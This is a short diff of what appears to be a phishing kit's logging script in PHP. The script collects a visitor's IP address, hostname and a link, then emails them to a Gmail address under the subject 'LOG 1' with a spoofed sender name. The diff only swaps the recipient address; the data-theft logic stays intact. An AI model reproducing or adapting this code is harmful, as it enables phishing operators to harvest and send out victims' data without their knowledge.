@@ -10,7 +10,7 @@ $message .= "IPs              : $ip\n";
 $message .= "HN               : $hostname\n";
 $message .= " U7l             : $link\n";
 $message .= "---------------\n";
-$send = "Ossmane45@gmail.com";
+$send = "@gmail.com";
 $subject = "LOG 1| $ip ";
 $headers = "From:Trnswise <don@mox.fr>";
 mail($send,$subject,$message,$headers);
